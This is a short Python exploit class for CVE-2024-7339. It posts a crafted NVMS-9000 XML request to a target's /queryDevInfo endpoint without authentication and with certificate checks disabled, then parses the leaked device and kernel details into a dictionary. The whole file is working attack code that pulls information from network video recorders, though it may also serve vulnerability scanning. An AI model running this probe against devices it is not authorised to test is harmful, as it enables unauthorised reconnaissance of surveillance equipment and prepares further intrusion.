import requests
import os
import xml.etree.ElementTree as ET
from unsafe.strings.user_agents import ua
import random
from typing import Union, Dict


class CVE_2024_7339:
    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")
        self.base_url = f"{self.url}/queryDevInfo"

    def check_vuln(self) -> Union[Dict[str, str], None]:
        headers = {
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests": "1",
            "Connection": "keep-alive",
            "User-Agent": random.choice(ua),
            "Content-Length": "103"
        }
        payload = (
            '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>'
        )

        try:
            response = requests.post(self.base_url, data=payload, headers=headers, timeout=10, verify=False)
            if response.status_code != 200:
                return None

            response_data = response.text
            if "</kenerlVersion>" in response_data:
                # Convert the response XML to a dictionary
                return self.__parse_xml_to_dict(response_data)

        except requests.RequestException:
            return None

    @staticmethod
    def __parse_xml_to_dict(xml_data: str) -> Dict[str, str]:
        root = ET.fromstring(xml_data)
        result_dict = {child.tag: child.text for child in root}
        return result_dict
